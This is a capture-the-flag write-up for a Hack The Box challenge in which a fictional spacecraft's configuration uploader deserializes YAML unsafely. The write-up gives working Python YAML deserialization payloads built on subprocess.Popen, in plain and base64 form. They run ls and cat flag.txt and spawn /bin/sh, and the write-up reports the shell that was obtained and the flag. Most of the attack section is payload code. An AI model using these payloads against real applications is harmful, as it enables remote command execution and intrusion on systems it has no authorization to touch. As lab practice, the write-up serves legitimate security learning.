# hijack

**SOLVED**

> The security of the alien spacecrafts did not prove very robust, and you have gained access to an interface allowing you to upload a new configuration to their ship's Thermal Control System. 
> Can you take advantage of the situation without raising any suspicion?

`nc 209.97.134.50 31978`

```txt
ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6ICcxMDAnLCBhdXRvX2NhbGlicmF0aW9uOiAnT04nLAogIHByb3B1bHNpb25fdGVtcDogJzEwMCcsIHNvbGFyX2FycmF5X3RlbXA6ICcxMDAnLCB1bml0czogQ30K

!!python/object:__main__.Config {IR_spectrometer_temp: '100', auto_calibration: 'ON',
  propulsion_temp: '100', solar_array_temp: '100', units: C}


!!python/object:__main__.Config {}
```

- https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization
- https://hackmd.io/@defund/HJZajCVlP

generated payload in `flag.py`, then base64 in cyberchef

```txt

!!python/object/apply:subprocess.Popen
- ls

ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBscw==

!!python/object/apply:subprocess.Popen
- cat
- flag.txt

ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBjYXQKLSBmbGFnLnR4dA==

didnt work...

!!python/object/apply:subprocess.Popen
- /bin/sh
ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSAvYmluL3No
```

popped shell - `cat flag.txt`

`HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}`
